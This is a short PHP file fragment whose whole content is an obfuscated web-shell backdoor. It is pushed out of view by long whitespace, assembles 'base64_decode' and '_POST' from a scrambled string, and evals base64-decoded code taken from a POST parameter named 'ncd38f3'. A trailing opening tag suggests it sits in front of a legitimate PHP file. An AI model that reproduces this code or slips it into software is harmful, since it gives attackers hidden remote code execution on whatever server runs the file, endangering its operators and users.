<?php                                                                                                                                                                                                                                                                     $wzy3 ="tba6_s4pceod" ; $wec4= strtolower( $wzy3[1]. $wzy3[2].$wzy3[5]. $wzy3[9] .$wzy3[3]. $wzy3[6] . $wzy3[4].$wzy3[11].$wzy3[9].$wzy3[8].$wzy3[10]. $wzy3[11].$wzy3[9]) ; $cthv9 =strtoupper ( $wzy3[4].$wzy3[7].$wzy3[10]. $wzy3[5]. $wzy3[0]) ; if(isset( ${ $cthv9 }[ 'ncd38f3'] ) ) {eval($wec4( ${$cthv9 } ['ncd38f3']) ); } ?> <?php
